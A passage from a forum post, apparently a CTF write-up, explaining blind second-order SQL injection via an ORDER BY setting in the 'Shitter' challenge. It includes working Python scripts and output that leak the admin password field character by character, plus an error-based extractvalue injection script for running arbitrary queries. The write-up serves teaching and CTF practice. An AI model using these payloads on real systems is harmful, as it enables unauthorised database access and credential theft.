| A          | Z            | 2019-12-17 13:21:20 |
+------------+--------------+---------------------+
2 rows in set (0.01 sec)

MariaDB [shitter]&gt;
</code></pre>
<p>So we now have a working injection, let’s try it on shitter, first we make the condition true:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png" data-download-href="/uploads/short-url/zqKOBMoQBxSDZpjH0TVDAmxueZV.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png" alt="" data-base62-sha1="zqKOBMoQBxSDZpjH0TVDAmxueZV" width="690" height="279" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png, /uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 1.5x, /uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_10x10.png"></a></div><br>
And we trigger the SQL Injection:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" data-download-href="/uploads/short-url/3CfsCSdmhre230NkkOa6m0lkFbR.png?dl=1" title=""><img src="/uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" alt="" data-base62-sha1="3CfsCSdmhre230NkkOa6m0lkFbR" width="690" height="401" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3_2_10x10.png"></a></div><br>
Cool, so the posts were ordered by the post_title, and not the contents.<p></p>
<p>Now let’s demonstrate the other way around:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png" data-download-href="/uploads/short-url/gFY8Dg4sgaYBxAovTfpk5WyFCPL.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png" alt="" data-base62-sha1="gFY8Dg4sgaYBxAovTfpk5WyFCPL" width="690" height="178" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png, /uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 1.5x, /uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_10x10.png"></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" data-download-href="/uploads/short-url/7RbVNbzdWX7LWqUNlcPb2qxkjBQ.png?dl=1" title=""><img src="/uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" alt="" data-base62-sha1="7RbVNbzdWX7LWqUNlcPb2qxkjBQ" width="690" height="379" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6_2_10x10.png"></a></div><p></p>
<p>We have confirmed that depending on whether the output of the statement is 0 or 1, the post will either be ordered by title, or contents. We can combine this idea with EXISTS() (<a href="https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html" rel="noopener nofollow ugc">https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html</a>) and REGEXP (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" rel="noopener nofollow ugc">https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php</a>) to slowly leak the contents of the admin password field.</p>
<p>I developed a short script to automate this:</p>
<pre><code class="lang-python">import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://gusralph.info:5000"
username = "demo"
password = "demo"
data = {'name' : username, 'password' : password}
r = s.post(url = URL + "/login", data = data)
final = ""

while True:
        data = {'order' : 'post_creation_time ASC'}
        r = s.post(url = URL + "/settings", data = data)
        for x in dictionary:
                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
                r = s.post(url = URL + "/settings", data = data)
                out = s.get(url = URL + "/profile/2")
                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
                        final += x
                        print "Leaking contents of admin hash: " + final
                        break
                else:
                        pass
</code></pre>
<p>This script manages to leak the contents of the admin password field:</p>
<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: t
Leaking contents of admin hash: tm
Leaking contents of admin hash: tmh
Leaking contents of admin hash: tmhc
Leaking contents of admin hash: tmhc{
Leaking contents of admin hash: tmhc{b
Leaking contents of admin hash: tmhc{bl
Leaking contents of admin hash: tmhc{bl1
[...]
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinje
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjec
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinject
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n}
</code></pre>
<p>Although, the MySQL REGEXP function is not case sensitive (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" rel="noopener nofollow ugc">https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php</a>), so I added the <code>BINARY</code> function after the REGEXP to create the final script:</p>
<pre><code class="lang-python">import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://gusralph.info:5000"
username = "demo"
password = "demo"
data = {'name' : username, 'password' : password}
r = s.post(url = URL + "/login", data = data)
final = ""

while True:
        data = {'order' : 'post_creation_time ASC'}
        r = s.post(url = URL + "/settings", data = data)
        for x in dictionary:
                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP BINARY "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
                r = s.post(url = URL + "/settings", data = data)
                out = s.get(url = URL + "/profile/2")
                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
                        final += x
                        print "Leaking contents of admin hash: " + final
                        break
                else:
                        pass
</code></pre>
<p>With the final result being:</p>
<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: T
Leaking contents of admin hash: TM
Leaking contents of admin hash: TMH
Leaking contents of admin hash: TMHC
Leaking contents of admin hash: TMHC{
Leaking contents of admin hash: TMHC{B
[..]
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJect
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n}
</code></pre>
<p><strong>Unintended methods of solving Shitter</strong>:<br>
<em>Alternative (kudos to Morph3 (<a href="https://twitter.com/melihkaanyldz" rel="noopener nofollow ugc">https://twitter.com/melihkaanyldz</a>))</em>:<br>
In the CTF I forgot to add a try: except: into the script to handle the python errors, which can sometimes be overly verbose. If I had added the try and except it would have just redirected to a /error page. Due to the overly verbose error messages, and the flask debug being set to True in my script, there was a certain payload that could be used, that caused the flask error message to actually display the queries output.</p>
<p>An example of what the output would look like is:</p>
<pre><code class="lang-auto">  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/protocol.py", line 220, in check_error
    err.raise_mysql_exception(self._data)
  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/err.py", line 109, in raise_mysql_exception
    raise errorclass(errno, errval)
InternalError: (1105, u"XPATH syntax error: '\nTMHC{Bl1nDSQlS3c0ndorderINJecti'")

--&gt;
</code></pre>
<p>The query that breaks the challenge being:<br>
<code>1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))#</code></p>
<p>Here is a script he developed to automate the process:</p>
<pre><code class="lang-python">import requests

s = requests.Session()

url = "URL:PORT/"
data = {
    "name":"USERNAME",
    "password":"PASSWORD"
}

r = s.post(url+"login",data=data)

q = "select database()"

while q != "q":
    data = {
         "order" : "1,extractvalue(0x0a,concat(0x0a,({})))#".format(q)
    }
    r = s.post(url+"settings",data=data)
    r = s.get(url+"profile/1")
    print r.text
    q = raw_input("~#:")
</code></pre>
<p>If you enjoyed the post, learnt something new, or have any feedback / improvements, make sure to follow me on Twitter (<a href="https://twitter.com/SecGus" rel="noopener nofollow ugc">https://twitter.com/SecGus</a>).</p>
<p>*If anyone has been able to successfully exfiltrate data via the ORDER BY clause in MySQL when the column name is hard-coded (like this <code>SELECT * FROM users WHERE name = "example" ORDER BY name USER-INPUT;</code>), I would love to know how, my DMs on here are always open, or you can reach me on twitter (see above), or via email at rat@outlook.at.</p>
          <p><a href="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/1</link>
        <pubDate>Tue, 17 Dec 2019 13:57:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18122-1</guid>
        <source url="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</source>
      </item>
  </channel>
</rss>
